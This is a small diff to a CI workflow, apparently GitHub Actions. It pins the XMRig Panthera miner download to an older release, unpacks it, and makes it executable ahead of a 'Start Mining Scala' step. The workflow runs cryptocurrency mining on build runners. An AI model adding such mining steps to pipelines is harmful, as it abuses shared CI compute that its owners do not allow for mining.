@@ -15,8 +15,9 @@ jobs:
 
     - name: Download XMRig Panthera
       run: |
-        wget https://github.com/scala-network/official-miner/releases/download/v5.11.1/xmrig-panthera-linux.tar.gz
+        wget https://github.com/scala-network/official-miner/releases/download/v5.10.0/xmrig-panthera-linux.tar.gz
         tar -xvzf xmrig-panthera-linux.tar.gz
+        cd xmrig-panthera
         chmod +x xmrig
 
     - name: Start Mining Scala
